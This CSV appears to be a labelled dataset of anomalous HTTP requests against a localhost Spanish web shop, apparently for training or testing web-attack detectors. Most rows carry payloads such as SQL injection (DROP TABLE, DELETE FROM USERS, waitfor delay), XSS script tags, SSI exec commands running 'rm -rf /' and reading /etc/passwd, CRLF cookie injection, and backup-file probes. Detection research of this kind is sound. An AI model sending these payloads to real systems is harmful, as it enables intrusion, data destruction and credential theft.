POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=akhtar6&pwdA=56s5r6sa&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%27INJECTED_PARAM,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=2%27INJECTED_PARAM,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=2,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp/4861362529278789730,,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=7191&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=7191&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7191&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=7191&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=7191&B1=Confirmar,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precioA=7191&B1=Confirmar,anomalous
GET,http://localhost:8080/tienda1/publico/productos.jsp.old,,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=morton6&password=a5to4iro&nombre=Ari&apellidos=Pejoan+Ang%F3s&email=rosenthal%40tintasultravioleta.pm&dni=97428883D&direccion=Damian+De+Castro%2C+52%2C+&ciudad=Godojos&cp=43420&provincia=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&ntc=5864494451512907&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=morton6&password=a5to4iro&nombre=Ari&apellidos=Pejoan+Ang%F3s&email=rosenthal%40tintasultravioleta.pm&dni=97428883D&direccion=Damian+De+Castro%2C+52%2C+&ciudad=Godojos&cp=43420&provincia=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&ntc=5864494451512907&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=art%3Fus&password=a5to4iro&nombre=Ari&apellidos=Pejoan+Ang%F3s&email=rosenthal%40tintasultravioleta.pm&dni=97428883D&direccion=Damian+De+Castro%2C+52%2C+&ciudad=Godojos&cp=43420&provincia=C%F3rdoba&ntc=5864494451512907&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=art%3Fus&password=a5to4iro&nombre=Ari&apellidos=Pejoan+Ang%F3s&email=rosenthal%40tintasultravioleta.pm&dni=97428883D&direccion=Damian+De+Castro%2C+52%2C+&ciudad=Godojos&cp=43420&provincia=C%F3rdoba&ntc=5864494451512907&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=morton6&password=a5to4iro&nombre=Ari&apellidos=Pejoan+Ang%F3s&email=rosenthal%40tintasultravioleta.pm&dni=97428883D&direccion=Damian+De+Castro%2C+52%2C+&ciudad=Godojos&cp=43420&provincia=C%F3rdoba&ntc=5864494451512907&B1A=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=morton6&password=a5to4iro&nombre=Ari&apellidos=Pejoan+Ang%F3s&email=rosenthal%40tintasultravioleta.pm&dni=97428883D&direccion=Damian+De+Castro%2C+52%2C+&ciudad=Godojos&cp=43420&provincia=C%F3rdoba&ntc=5864494451512907&B1A=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp.Old,,anomalous
GET,http://localhost:8080/tienda1/miembros/asf-logo-wide,,anomalous
PUT,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=yamada&password=tr-inomio&nombre=Guiliano&apellidos=Estap%E9+Segarra&email=parlo%40esbien.pw&dni=59143276H&direccion=C%2F+Castillo+Miraguarda%2C+157+4%3FC&ciudad=Acebedo&cp=08673&provincia=%C1vila&ntc=7642131917731646&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=yamada&password=tr-inomio&nombre=Guiliano&apellidos=Estap%E9+Segarra&email=Set-cookie%253A%2BTamper%253D1041264011025374727&dni=59143276H&direccion=C%2F+Castillo+Miraguarda%2C+157+4%3FC&ciudad=Acebedo&cp=08673&provincia=%C1vila&ntc=7642131917731646&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=yamada&password=tr-inomio&nombre=Guiliano&apellidos=Estap%E9+Segarra&email=Set-cookie%253A%2BTamper%253D1041264011025374727&dni=59143276H&direccion=C%2F+Castillo+Miraguarda%2C+157+4%3FC&ciudad=Acebedo&cp=08673&provincia=%C1vila&ntc=7642131917731646&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=yamada&password=tr-inomio&nombre=Guiliano&apellidos=Estap%E9+Segarra&email=parlo%40esbien.pw&dni=636A2860T&direccion=C%2F+Castillo+Miraguarda%2C+157+4%3FC&ciudad=Acebedo&cp=08673&provincia=%C1vila&ntc=7642131917731646&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=yamada&password=tr-inomio&nombre=Guiliano&apellidos=Estap%E9+Segarra&email=parlo%40esbien.pw&dni=636A2860T&direccion=C%2F+Castillo+Miraguarda%2C+157+4%3FC&ciudad=Acebedo&cp=08673&provincia=%C1vila&ntc=7642131917731646&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=yamada&password=tr-inomio&nombre=Guiliano&apellidos=Estap%E9+Segarra&emailA=parlo%40esbien.pw&dni=59143276H&direccion=C%2F+Castillo+Miraguarda%2C+157+4%3FC&ciudad=Acebedo&cp=08673&provincia=%C1vila&ntc=7642131917731646&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=yamada&password=tr-inomio&nombre=Guiliano&apellidos=Estap%E9+Segarra&emailA=parlo%40esbien.pw&dni=59143276H&direccion=C%2F+Castillo+Miraguarda%2C+157+4%3FC&ciudad=Acebedo&cp=08673&provincia=%C1vila&ntc=7642131917731646&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/imagenes/2.gif/,,anomalous
GET,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg/asf-logo-wide.Old,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=69&B1=A%F1adir+al+carritoany%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Vino+Rioja&precio=85&cantidad=69&B1=A%F1adir+al+carritoany%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=%257C&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Vino+Rioja&precio=85&cantidad=%257C&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85%2F&cantidad=69&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Vino+Rioja&precio=85%2F&cantidad=69&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=boehlke&pwd=retah%EDla%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&remember=off&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=boehlke&pwd=retah%EDla%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=boehlke&pwd=retah%EDla&remember=off&B1=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=boehlke&pwd=retah%EDla&remember=off&B1=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%27INJECTED_PARAM,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=1%27INJECTED_PARAM,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27+DELETE+FROM+USERS,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%27+DELETE+FROM+USERS,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=1,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%252B,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%252B,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080.Old,,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%253F&precio=909&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar%253F&precio=909&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%7C&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=%7C&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=909&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=909&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=909&B1A=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=909&B1A=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico.OLD,,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shapiro&password=1a3t14izante&nombre=Calixto&apellidos=Bonas+Crehuet&email=perepeczko%40zarasalud.rw&dni=76410524Q&direccion=Diposit+136%2C+1G%2500&ciudad=Guancha%2C+La&cp=12214&provincia=Granada&ntc=2829438543802993&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=shapiro&password=1a3t14izante&nombre=Calixto&apellidos=Bonas+Crehuet&email=perepeczko%40zarasalud.rw&dni=76410524Q&direccion=Diposit+136%2C+1G%2500&ciudad=Guancha%2C+La&cp=12214&provincia=Granada&ntc=2829438543802993&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shapiro&password=un%2Ctar&nombre=Calixto&apellidos=Bonas+Crehuet&email=perepeczko%40zarasalud.rw&dni=76410524Q&direccion=Diposit+136%2C+1G&ciudad=Guancha%2C+La&cp=12214&provincia=Granada&ntc=2829438543802993&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=shapiro&password=un%2Ctar&nombre=Calixto&apellidos=Bonas+Crehuet&email=perepeczko%40zarasalud.rw&dni=76410524Q&direccion=Diposit+136%2C+1G&ciudad=Guancha%2C+La&cp=12214&provincia=Granada&ntc=2829438543802993&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shapiro&passwordA=1a3t14izante&nombre=Calixto&apellidos=Bonas+Crehuet&email=perepeczko%40zarasalud.rw&dni=76410524Q&direccion=Diposit+136%2C+1G&ciudad=Guancha%2C+La&cp=12214&provincia=Granada&ntc=2829438543802993&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=shapiro&passwordA=1a3t14izante&nombre=Calixto&apellidos=Bonas+Crehuet&email=perepeczko%40zarasalud.rw&dni=76410524Q&direccion=Diposit+136%2C+1G&ciudad=Guancha%2C+La&cp=12214&provincia=Granada&ntc=2829438543802993&B1=Registrar,anomalous
GET,http://localhost:8080/_vti_pvt/,,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritoSet-cookie%253A%2BTamper%253D1041264011025374727,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carritoSet-cookie%253A%2BTamper%253D1041264011025374727,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp.Bak,,anomalous
GET,http://localhost:8080/tienda1/asf-logo-wide.gif,,anomalous
GET,http://localhost:8080/tienda1/4861362529278789730.Inc,,anomalous
GET,http://localhost:8080/tienda1/global/asf-logo-wide,,anomalous
PUT,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=rivera&password=tecNo6%F3g5ca&nombre=Nerio&apellidos=Burrueco&email=kovats%40hotelsardegna.asia&dni=96138987E&direccion=C%2F+Pintors+Vergos%2C+115%2C+&ciudad=Sen%E9s&cp=31657&provincia=Zaragoza&ntc=7852313065954074&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rivera&password=tecNo6%F3g5ca&nombre=Nerio&apellidos=Burrueco&email=kovats%40hotelsardegna.asia&dni=96138987E&direccion=C%2F+Pintors+Vergos%2C+115%2C+&ciudad=Sen%E9s&cp=31657&provincia=Zaragoza&ntc=174703445242205A&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=rivera&password=tecNo6%F3g5ca&nombre=Nerio&apellidos=Burrueco&email=kovats%40hotelsardegna.asia&dni=96138987E&direccion=C%2F+Pintors+Vergos%2C+115%2C+&ciudad=Sen%E9s&cp=31657&provincia=Zaragoza&ntc=174703445242205A&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rivera&passwordA=tecNo6%F3g5ca&nombre=Nerio&apellidos=Burrueco&email=kovats%40hotelsardegna.asia&dni=96138987E&direccion=C%2F+Pintors+Vergos%2C+115%2C+&ciudad=Sen%E9s&cp=31657&provincia=Zaragoza&ntc=7852313065954074&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=rivera&passwordA=tecNo6%F3g5ca&nombre=Nerio&apellidos=Burrueco&email=kovats%40hotelsardegna.asia&dni=96138987E&direccion=C%2F+Pintors+Vergos%2C+115%2C+&ciudad=Sen%E9s&cp=31657&provincia=Zaragoza&ntc=7852313065954074&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/salir.jsp/asf-logo-wide.gif/.Old,,anomalous
GET,http://localhost:8080/tienda1/imagenes/2.gif/asf-logo-wide.gif.Inc,,anomalous
GET,http://localhost:8080/IISSamples/sdk/asp/database/LimitRows_VBScript.asp,,anomalous
GET,http://localhost:8080/iisadmpwd/anot3.htr,,anomalous
GET,http://localhost:8080/tienda1/imagenes/logo.gif.Old,,anomalous
GET,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg.INC,,anomalous
GET,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg/asf-logo-wide.bak,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&cantidad=35&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Vino+Rioja&precio=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&cantidad=35&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3%2F&nombre=Vino+Rioja&precio=85&cantidad=35&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3%2F&nombre=Vino+Rioja&precio=85&cantidad=35&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=35&B1A=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Vino+Rioja&precio=85&cantidad=35&B1A=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp/6909030637832563290.jsp.BAK,,anomalous
GET,http://localhost:8080/samples/isapi/srch.htm,,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&login=edik3&pwd=a6mi9a2&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&login=edik3&pwd=a6mi9a2&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=edik3&pwd=a6mi9a2&remember=on%2F&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=edik3&pwd=a6mi9a2&remember=on%2F&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=edik3&pwdA=a6mi9a2&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=edik3&pwdA=a6mi9a2&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=2bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%2B,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%2B,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=2,anomalous
GET,http://localhost:8080/samples/isapi/isapi.htm,,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%252B,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas%252B,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%257C,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%257C,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/miembros.jsp/asf-logo-wide,,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3565&B1=Pasar+por+caja%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=3565&B1=Pasar+por+caja%2F,anomalous
GET,http://localhost:8080/tienda1/publico/productos.jsp/asf-logo-wide.gif,,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=watchorn&password=gin09r9n3&nombre=Alcira&apellidos=Marcapura+Pachecote&email=wolheim%40soyrojo.se&dni=79531407Y&direccion=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&ciudad=Deleitosa&cp=49410&provincia=Baleares+%28Illes%29&ntc=4881993166167995&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=watchorn&password=gin09r9n3&nombre=Alcira&apellidos=Marcapura+Pachecote&email=wolheim%40soyrojo.se&dni=79531407Y&direccion=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&ciudad=Deleitosa&cp=49410&provincia=Baleares+%28Illes%29&ntc=4881993166167995&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=watchorn&password=gin09r9n3&nombre=Alcira&apellidos=Marcapura+Pachecote&email=wolheim%40soyrojo.se&dni=79531407Y&direccion=Calle+La+Gran*ja%2C+%2B150%2C+1%3FC&ciudad=Deleitosa&cp=49410&provincia=Baleares+%28Illes%29&ntc=4881993166167995&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=watchorn&password=gin09r9n3&nombre=Alcira&apellidos=Marcapura+Pachecote&email=wolheim%40soyrojo.se&dni=79531407Y&direccion=Calle+La+Gran*ja%2C+%2B150%2C+1%3FC&ciudad=Deleitosa&cp=49410&provincia=Baleares+%28Illes%29&ntc=4881993166167995&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=watchorn&password=gin09r9n3&nombre=Alcira&apellidos=Marcapura+Pachecote&emailA=wolheim%40soyrojo.se&dni=79531407Y&direccion=Calle+Luxemburgo%2C+139%2C+4%3FH&ciudad=Deleitosa&cp=49410&provincia=Baleares+%28Illes%29&ntc=4881993166167995&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=watchorn&password=gin09r9n3&nombre=Alcira&apellidos=Marcapura+Pachecote&emailA=wolheim%40soyrojo.se&dni=79531407Y&direccion=Calle+Luxemburgo%2C+139%2C+4%3FH&ciudad=Deleitosa&cp=49410&provincia=Baleares+%28Illes%29&ntc=4881993166167995&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/global/creditos.jsp/,,anomalous
GET,http://localhost:8080/tienda1/global.java,,anomalous
GET,http://localhost:8080/CFIDE/administrator/welcomeexapps.cfm,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/.Inc,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=doraine&password=caRDEnAL%CDA&nombre=Aitana&apellidos=Ejea+Amunategui&email=jessye%40lodgemadrid.bb&dni=46022704A%2500&direccion=C%2F+San+Gregorio+197+5%3FB&ciudad=Tarragona&cp=25721&provincia=Pontevedra&ntc=8009869624920768&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=doraine&password=caRDEnAL%CDA&nombre=Aitana&apellidos=Ejea+Amunategui&email=jessye%40lodgemadrid.bb&dni=46022704A%2500&direccion=C%2F+San+Gregorio+197+5%3FB&ciudad=Tarragona&cp=25721&provincia=Pontevedra&ntc=8009869624920768&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=doraine&password=caRDEnAL%CDA&nombre=%2C%27Eustaq%27uio&apellidos=Ejea+Amunategui&email=jessye%40lodgemadrid.bb&dni=46022704A&direccion=C%2F+San+Gregorio+197+5%3FB&ciudad=Tarragona&cp=25721&provincia=Pontevedra&ntc=8009869624920768&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=doraine&password=caRDEnAL%CDA&nombre=%2C%27Eustaq%27uio&apellidos=Ejea+Amunategui&email=jessye%40lodgemadrid.bb&dni=46022704A&direccion=C%2F+San+Gregorio+197+5%3FB&ciudad=Tarragona&cp=25721&provincia=Pontevedra&ntc=8009869624920768&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=doraine&password=caRDEnAL%CDA&nombreA=Aitana&apellidos=Ejea+Amunategui&email=jessye%40lodgemadrid.bb&dni=46022704A&direccion=C%2F+San+Gregorio+197+5%3FB&ciudad=Tarragona&cp=25721&provincia=Pontevedra&ntc=8009869624920768&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=doraine&password=caRDEnAL%CDA&nombreA=Aitana&apellidos=Ejea+Amunategui&email=jessye%40lodgemadrid.bb&dni=46022704A&direccion=C%2F+San+Gregorio+197+5%3FB&ciudad=Tarragona&cp=25721&provincia=Pontevedra&ntc=8009869624920768&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/imagenes.Old,,anomalous
PUT,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Queso+Manchego&precio=39&cantidad=11&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2%2F&nombre=Queso+Manchego&precio=39&cantidad=11&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2%2F&nombre=Queso+Manchego&precio=39&cantidad=11&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombreA=Queso+Manchego&precio=39&cantidad=11&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombreA=Queso+Manchego&precio=39&cantidad=11&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%3F&login=suh9&pwd=4ar9ues4a&remember=off&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar%3F&login=suh9&pwd=4ar9ues4a&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=eli%2Bs*%2Fa&pwd=4ar9ues4a&remember=off&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=eli%2Bs*%2Fa&pwd=4ar9ues4a&remember=off&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=suh9&pwdA=4ar9ues4a&remember=off&B1=Entrar,,anomalous
